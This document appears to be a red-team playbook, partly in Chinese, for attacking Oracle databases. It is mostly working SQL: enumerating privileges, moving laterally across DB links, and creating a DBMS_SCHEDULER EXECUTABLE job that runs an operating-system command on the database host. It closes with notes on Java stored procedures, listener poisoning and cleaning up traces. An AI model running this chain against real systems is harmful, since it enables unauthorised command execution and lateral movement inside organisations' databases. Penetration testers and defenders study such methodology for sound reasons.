# Oracle Direct-Service Attack Chain

---

## 1. Gate

```sql
SELECT USER FROM dual;
SELECT * FROM SESSION_PRIVS ORDER BY PRIVILEGE;
SELECT * FROM USER_DB_LINKS;
SELECT owner,job_name,job_type,enabled FROM ALL_SCHEDULER_JOBS FETCH FIRST 50 ROWS ONLY;
```

重点：

```text
CREATE JOB
CREATE EXTERNAL JOB
CREATE ANY JOB
Java permissions
DB Link
file/network packages
```

---

## 2. DB Link Lateral

```sql
SELECT db_link,username,host FROM USER_DB_LINKS;
SELECT * FROM dual@LINK;
```

继续读取远端身份：

```sql
SELECT user FROM dual@LINK;
```

多级 DB Link 可以在当前数据库链内连续验证，但每跳都记录身份/权限。

---

## 3. Scheduler External Job

Oracle 当前文档明确：`EXECUTABLE` job owner 需要 `CREATE EXTERNAL JOB`；创建自己 schema 的 job 还需要 `CREATE JOB`。

满足条件后用临时 marker job：

```sql
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name   => 'SA_MARKER',
    job_type   => 'EXECUTABLE',
    job_action => '/usr/bin/id',
    enabled    => TRUE,
    auto_drop  => TRUE);
END;
/
```

验证 job run details；不要假设 Oracle service OS identity 一定高权。

---

## 4. Java Stored Procedure

Java-in-DB 路径高度依赖数据库版本、Java组件、Java policy 权限。只有确认 `JAVA` feature 和 RuntimePermission/file/socket 权限后才继续；不要复制旧版“一条 Runtime.exec 就通杀”的写法。

---

## 5. TNS / Listener

Listener poisoning 是版本和配置敏感的老技术。现代环境先看精确版本/registration restrictions；没有一手证据不要默认可用。

---

## 6. Cleanup

```text
temporary scheduler job auto_drop
DROP temporary Java objects created by test
restore changed scheduler/config state
```
